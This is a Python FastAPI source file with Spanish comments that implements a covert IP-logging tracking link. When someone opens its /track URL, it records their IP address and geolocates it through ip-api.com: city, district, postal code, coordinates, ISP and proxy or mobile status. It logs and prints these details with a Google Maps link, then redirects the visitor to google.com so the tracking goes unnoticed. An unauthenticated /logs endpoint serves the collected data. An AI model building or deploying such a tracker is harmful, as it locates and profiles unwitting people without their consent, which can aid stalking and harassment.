from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse, PlainTextResponse
from datetime import datetime
import os
import httpx

app = FastAPI()
LOG_FILE = "ip_logs.txt"

# Asegura que el archivo exista desde el arranque
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("Timestamp | IP | País | Región | Ciudad | Distrito | CP | Coordenadas | Zona horaria | ISP | Organización | AS | Móvil | Proxy\n")

@app.get("/")
def root():
    return RedirectResponse("/track")

@app.get("/track")
async def track(request: Request):
    # Intenta obtener la IP real del visitante (encabezado o conexión directa)
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
    
    # Consulta información geográfica detallada
    info = {
        "country": "Desconocido", "countryCode": "Desconocido", "region": "Desconocido", 
        "regionName": "Desconocido", "city": "Desconocido", "district": "Desconocido",
        "zip": "Desconocido", "lat": "Desconocido", "lon": "Desconocido", 
        "timezone": "Desconocido", "isp": "Desconocido", "org": "Desconocido", 
        "as": "Desconocido", "mobile": "Desconocido", "proxy": "Desconocido"
    }
    try:
        async with httpx.AsyncClient() as client:
            # Solicita todos los campos disponibles
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query")
            data = r.json()
            if data["status"] == "success":
                info["country"] = data.get("country", "Desconocido")
                info["countryCode"] = data.get("countryCode", "Desconocido")
                info["region"] = data.get("region", "Desconocido")
                info["regionName"] = data.get("regionName", "Desconocido")
                info["city"] = data.get("city", "Desconocido")
                info["district"] = data.get("district", "Desconocido")
                info["zip"] = data.get("zip", "Desconocido")
                info["lat"] = data.get("lat", "Desconocido")
                info["lon"] = data.get("lon", "Desconocido")
                info["timezone"] = data.get("timezone", "Desconocido")
                info["isp"] = data.get("isp", "Desconocido")
                info["org"] = data.get("org", "Desconocido")
                info["as"] = data.get("as", "Desconocido")
                info["mobile"] = "Sí" if data.get("mobile", False) else "No"
                info["proxy"] = "Sí" if data.get("proxy", False) else "No"
    except Exception as e:
        print(f"Error al obtener información geográfica: {e}")
    
    # Prepara la información detallada para logging
    timestamp = datetime.now().isoformat()
    log_line = (f"{timestamp} | IP: {ip} | País: {info['country']} ({info['countryCode']}) | "
                f"Región: {info['regionName']} ({info['region']}) | Ciudad: {info['city']} | "
                f"Distrito: {info['district']} | CP: {info['zip']} | "
                f"Coordenadas: {info['lat']}, {info['lon']} | Zona horaria: {info['timezone']} | "
                f"ISP: {info['isp']} | Org: {info['org']} | AS: {info['as']} | "
                f"Móvil: {info['mobile']} | Proxy: {info['proxy']}\n")
    
    # Guarda la información en el archivo
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line)
    
    # Muestra la información detallada en consola
    print("=" * 100)
    print("🌍 NUEVO VISITANTE DETECTADO:")
    print(f"📅 Timestamp: {timestamp}")
    print(f"🌐 IP: {ip}")
    print(f"🏳️  País: {info['country']} ({info['countryCode']})")
    print(f"🗺️  Región: {info['regionName']} ({info['region']})")
    print(f"🏙️  Ciudad: {info['city']}")
    if info['district'] != "Desconocido":
        print(f"🏘️  Distrito: {info['district']}")
    if info['zip'] != "Desconocido":
        print(f"📮 Código Postal: {info['zip']}")
    if info['lat'] != "Desconocido" and info['lon'] != "Desconocido":
        print(f"📍 Coordenadas: {info['lat']}, {info['lon']}")
        print(f"🗺️  Google Maps: https://www.google.com/maps?q={info['lat']},{info['lon']}")
    print(f"🕐 Zona horaria: {info['timezone']}")
    print(f"🌐 ISP: {info['isp']}")
    if info['org'] != "Desconocido" and info['org'] != info['isp']:
        print(f"🏢 Organización: {info['org']}")
    print(f"🔢 AS: {info['as']}")
    print(f"📱 Conexión móvil: {info['mobile']}")
    print(f"🛡️  Usando proxy: {info['proxy']}")
    print("=" * 100)
    
    return RedirectResponse("https://www.google.com")

@app.get("/logs", response_class=PlainTextResponse)
def get_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "El archivo de logs no existe aún."